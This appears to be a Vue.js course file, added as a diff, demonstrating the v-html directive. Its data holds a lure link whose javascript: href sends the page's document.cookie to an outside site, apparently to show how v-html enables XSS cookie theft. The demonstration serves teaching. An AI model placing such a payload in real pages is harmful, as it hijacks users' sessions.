@@ -1,0 +1,49 @@
+<!--
+ * @Author       : helishou
+ * @Date         : 2021-10-12 23:58:19
+ * @LastEditTime : 2021-10-13 22:56:21
+ * @LastEditors  : helishou
+ * @Description  : 
+ * @FilePath     : \Vue\015.内置指令\v-html.html
+ * 你用你的指尖,阻止我说再见,在bug完全失去之前
+-->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>手机表单</title>
+    <!-- 引入Vue -->
+    <style>
+      .normal {
+        background-color: aqua; 
+      }
+      .innormal {
+        background-color: blueviolet;
+      }
+    </style>
+    <script type="text/javascript" src="../js/vue.js"></script>
+  </head>
+  <body>
+    <!--渲染包含html结构的内容-->
+    <div id="root">
+      <div v-html="a"></div>
+    </div>
+    <script>
+      // 全局过滤器
+      const vm = new Vue({
+        data() {
+          return { a: "<a href=javascript:location.href='http://www.baidu.com'+document.cookie>兄弟我找到你的东西了</a>" };
+        },
+        methods: {
+          demo() {
+            console.log(this._data);
+          },
+        },
+        computed: {}
+      });
+      vm.$mount("#root"); //第二章写法
+    </script>
+  </body>
+</html>
